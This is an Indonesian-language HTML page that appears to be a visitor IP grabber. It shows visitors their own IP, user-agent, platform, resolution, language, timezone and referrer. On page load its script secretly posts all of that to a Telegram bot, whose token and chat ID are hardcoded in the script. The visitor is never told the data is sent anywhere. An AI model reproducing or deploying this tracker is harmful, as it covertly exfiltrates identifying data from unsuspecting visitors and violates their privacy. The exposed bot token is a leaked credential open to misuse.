<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hasil Data Pengunjung</title>
  <style>
    body {
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      color: #333;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }
    h1 {
      margin-bottom: 10px;
    }
    .box {
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 20px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    .info {
      margin: 8px 0;
    }
    .label {
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="box" id="result">
    <h1>Hasil Data Pengunjung</h1>
    <div class="info"><span class="label">IP Address:</span> <span id="ip">Memuat...</span></div>
    <div class="info"><span class="label">User-Agent:</span> <span id="ua"></span></div>
    <div class="info"><span class="label">Platform:</span> <span id="platform"></span></div>
    <div class="info"><span class="label">Resolusi:</span> <span id="res"></span></div>
    <div class="info"><span class="label">Bahasa:</span> <span id="lang"></span></div>
    <div class="info"><span class="label">Timezone:</span> <span id="tz"></span></div>
    <div class="info"><span class="label">Referrer:</span> <span id="ref"></span></div>
    <div class="info"><span class="label">Waktu:</span> <span id="time"></span></div>
  </div>

  <script>
    const BOT_TOKEN = '7727867910:AAE_rsJLjeqTNyycFC0MWqgRXOaUKVVzfYM';
    const CHAT_ID = '6676770258';

    const ua = navigator.userAgent;
    const waktu = new Date().toLocaleString();
    const bahasa = navigator.language;
    const resolusi = `${screen.width}x${screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform;
    const referrer = document.referrer || 'Langsung';

    document.getElementById("ua").textContent = ua;
    document.getElementById("platform").textContent = platform;
    document.getElementById("res").textContent = resolusi;
    document.getElementById("lang").textContent = bahasa;
    document.getElementById("tz").textContent = timezone;
    document.getElementById("ref").textContent = referrer;
    document.getElementById("time").textContent = waktu;

    fetch('https://api64.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        document.getElementById("ip").textContent = ip;

        const pesan = `
Data Pengunjung:
IP: ${ip}
User-Agent: ${ua}
Platform: ${platform}
Resolusi: ${resolusi}
Bahasa: ${bahasa}
Timezone: ${timezone}
Referrer: ${referrer}
Waktu: ${waktu}
        `;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan,
            parse_mode: 'HTML'
          })
        });
      });
  </script>
</body>
</html>
